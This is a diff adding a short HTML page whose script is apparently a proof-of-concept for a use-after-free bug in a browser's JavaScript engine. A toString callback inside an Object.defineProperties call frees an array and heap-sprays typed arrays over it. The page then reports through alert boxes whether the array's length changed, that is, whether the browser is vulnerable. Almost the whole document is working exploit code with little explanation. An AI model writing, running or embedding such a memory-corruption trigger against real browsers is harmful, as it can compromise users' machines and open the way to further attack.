@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>test</title>
+    <script>
+      var arr = new Array(2047);
+      var not_number = {};
+      var attempts = new Array(4250000);
+      var pressure = new Array(100);
+      var props = {
+        p0 : { value : 0 },
+        p1 : { value : 1 },
+        p2 : { value : 2 },
+        p3 : { value : 3 },
+        p4 : { value : 4 },
+        p5 : { value : 5 },
+        p6 : { value : 6 },
+        p7 : { value : 7 },
+        p8 : { value : 8 },
+        length : { value : not_number },
+        // memo
+        stale : { value : arr },
+        after : { value : 666 }
+      };
+      not_number.toString = function() {
+        arr = null;
+        props['stale']['value'] = null;
+        // spray
+        for (var i = 0; i < pressure.length; i++) {
+          pressure[i] = new Uint32Array(262144);
+        }
+        var buffer = new ArrayBuffer(80);
+        var uintArray = new Uint32Array(buffer);
+        uintArray[0] = 0xAABBCCDD;
+        for (i = 0; i < attempts.length; i++) {
+          attempts[i] = new Uint32Array(buffer);
+        }
+        return 10;
+      }
+    
+      var target = [];
+      var before_len = arr.length;
+      Object.defineProperties(target, props);
+      var stale = target.stale;
+      var after_len = stale.length;
+      // should consistently fail with multiple attempts
+      // if not vulnerable. if doesn't prompt; success.
+      alert("pre assertion superstition alert");
+      if (before_len == after_len) {
+        alert("not vulnerable " + before_len + ' to ' + after_len);
+      } else {
+        alert('size changed from ' + before_len + ' to ' + after_len);
+      }
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
